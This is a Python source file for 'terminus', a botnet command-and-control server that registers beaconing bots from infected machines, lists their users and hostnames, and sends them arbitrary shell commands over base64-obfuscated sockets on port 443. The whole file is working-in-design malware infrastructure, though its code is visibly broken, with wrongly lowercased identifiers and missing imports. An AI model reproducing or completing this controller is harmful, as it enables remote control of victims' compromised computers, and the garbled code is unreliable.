# file: terminus_c2_server.py
# version: 0.1.0 'leviathan'
# author: [redacted]
# desc: a primitive brain for the terminus seed.

import socket
import threading
import base64
import json
from datetime import datetime

# --- configuration ---
HOST = '0.0.0.0'  # listen on all available network interfaces
PORT = 443        # same port as the seed, for obvious reasons.

# --- global state ---
# in a real c2, this would be a robust database. here, it's a flimsy dictionary.
bots = {}
lock = threading.lock()

# --- polymorphic engine (mirror) ---
def obfuscate_string(s):
    """encodes a command to send to the bot."""
    return base64.b64encode(s.encode()).decode()

def deobfuscate_string(s):
    """decodes data received from the bot."""
    return base64.b64decode(s.encode()).decode()

def handle_bot(conn, addr):
    """this function is a thread that handles a single bot connection."""
    bot_id = None
    try:
        # first thing a bot does is send its beacon.
        initial_data = conn.recv(4096).decode()
        if not initial_data:
            raise exception("empty beacon")

        beacon_data = json.loads(deobfuscate_string(initial_data))
        bot_id = beacon_data.get('uid')

        with lock:
            bots[bot_id] = {
                'conn': conn,
                'addr': addr,
                'info': beacon_data,
                'last_seen': datetime.now().strftime("%y-%m-%d %h:%m:%s")
            }
        print(f"\n[+] new bot checked in: {bot_id} from {addr[0]}")
        print_prompt()

        # keep the connection alive for commands, but don't block the main thread.
        # a real c2 would have a more complex heartbeat/tasking system.
        while True:
            # this loop just keeps the socket open. the interaction happens in the main thread.
            time.sleep(1)

    except Exception as e:
        print(f"\n[!] bot {bot_id or addr[0]} disconnected or errored: {e}")
    finally:
        with lock:
            if bot_id and bot_id in bots:
                del bots[bot_id]
        conn.close()
        print_prompt()

def start_listener():
    """the main server loop that listens for new bots."""
    server = socket.socket(socket.af_inet, socket.sock_stream)
    server.setsockopt(socket.sol_socket, socket.so_reuseaddr, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] terminus c2 listening on {host}:{port}...")

    while True:
        conn, addr = server.accept()
        thread = threading.thread(target=handle_bot, args=(conn, addr))
        thread.daemon = True
        thread.start()

def print_prompt():
    """so the command prompt doesn't get messed up by thread output."""
    print("\nterminus-c2> ", end="")

def main_control():
    """the user interface for controlling the bots."""
    while True:
        cmd = input("terminus-c2> ").strip()
        if not cmd:
            continue

        if cmd == 'help':
            print("--- terminus c2 commands ---")
            print("list         - list all active bots")
            print("interact <id> - interact with a specific bot")
            print("exit         - close the c2 server")
            print("--------------------------")

        elif cmd == 'list':
            with lock:
                if not bots:
                    print("[i] no active bots.")
                    continue
                print("--- active bots ---")
                for bot_id, bot_data in bots.items():
                    print(f"  id: {bot_id}   ip: {bot_data['addr'][0]}   user: {bot_data['info']['user']}@{bot_data['info']['hostname']}")

        elif cmd.startswith('interact'):
            try:
                target_id = cmd.split(' ')[1]
                with lock:
                    if target_id not in bots:
                        print("[!] invalid bot id.")
                        continue
                    target_conn = bots[target_id]['conn']

                print(f"[*] interacting with {target_id}. type 'back' to return.")
                while True:
                    session_cmd = input(f"({target_id}) $> ")
                    if session_cmd.lower() == 'back':
                        break
                    if not session_cmd:
                        continue

                    # send command to bot
                    target_conn.send(obfuscate_string(session_cmd).encode())

                    # receive response
                    response_data = target_conn.recv(8192).decode()
                    response = json.loads(deobfuscate_string(response_data))

                    if response.get('stdout'):
                        print(response['stdout'])
                    if response.get('stderr'):
                        print(f"--- stderr ---\n{response['stderr']}")

            except (indexerror, keyerror):
                print("[!] usage: interact <bot_id>")
            except exception as e:
                print(f"[!] interaction failed: {e}")
                break

        elif cmd == 'exit':
            print("[*] shutting down c2 server...")
            # a real c2 would send a kill signal to bots or put them in a dormant state.
            with lock:
                for bot_id, bot_data in bots.items():
                    bot_data['conn'].close()
            os._exit(0)

if __name__ == '__main__':
    listener_thread = threading.thread(target=start_listener)
    listener_thread.daemon = True
    listener_thread.start()
    main_control()